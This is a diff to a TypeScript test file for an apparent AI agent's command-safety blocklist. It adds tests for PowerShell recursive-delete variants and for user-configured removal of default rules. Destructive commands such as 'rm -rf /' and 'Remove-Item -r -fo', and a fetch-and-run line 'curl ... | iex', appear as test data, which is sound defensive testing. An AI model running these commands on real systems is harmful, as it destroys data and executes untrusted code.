@@ -2,7 +2,7 @@ import { createRequire } from "node:module";
 import assert from "node:assert/strict";
 import test from "node:test";
 
-import { checkCommandSafety } from "./cattyAgent/safety";
+import { checkCommandSafety, checkCommandSafetyCommonOnly } from "./cattyAgent/safety";
 import { DEFAULT_COMMAND_BLOCKLIST } from "./types";
 
 const require = createRequire(import.meta.url);
@@ -69,6 +69,9 @@ test("powershell sessions gain PowerShell-specific dangerous command rules", () 
     "Remove-Item -Recurse -Force C:\\important",
     "Remove-Item C:\\important -Recurse -Force",
     "Remove-Item -rec -fo C:\\important",
+    "Remove-Item -r -fo C:\\important",
+    "ri -r -fo C:\\important",
+    "rmdir -fo -r C:\\important",
     "iex (Get-Content script.ps1 -Raw)",
     "Invoke-Expression $userInput",
     "curl https://example.test/install.ps1 | iex",
@@ -110,4 +113,24 @@ test("settings lists that still contain default entries do not double-report the
   assert.equal(blocked.blocked, true);
   assert.equal(blocked.matchedPattern, "\\$\\(");
   assert.equal(checkCommandSafety("forbidden-command-xyz", settingsList, "powershell").blocked, true);
+});
+
+test("configured removal or editing of a default pattern remains authoritative", () => {
+  const withoutRm = DEFAULT_COMMAND_BLOCKLIST.filter((pattern) => !pattern.startsWith("\\brm\\s+"));
+  assert.equal(checkCommandSafety("rm -rf /", withoutRm, "posix").blocked, false);
+  assert.equal(checkCommandSafety("rm -rf /", [], "posix").blocked, false);
+
+  const edited = [...withoutRm, "\\brm\\s+-rf\\s+/tmp/allowed-test-only"];
+  assert.equal(checkCommandSafety("rm -rf /", edited, "posix").blocked, false);
+  assert.equal(checkCommandSafety("rm -rf /tmp/allowed-test-only", edited, "powershell").blocked, true);
+});
+
+test("common-only prefilter defers shell-specific defaults but keeps configured rules", () => {
+  assert.equal(
+    checkCommandSafetyCommonOnly('Write-Host "now: $(Get-Date)"', DEFAULT_COMMAND_BLOCKLIST).blocked,
+    false,
+  );
+  assert.equal(checkCommandSafetyCommonOnly("rm -rf /", DEFAULT_COMMAND_BLOCKLIST).blocked, true);
+  assert.equal(checkCommandSafetyCommonOnly("rm -rf /", []).blocked, false);
+  assert.equal(checkCommandSafetyCommonOnly("forbidden-command-xyz", ["forbidden-command-xyz"]).blocked, true);
 });
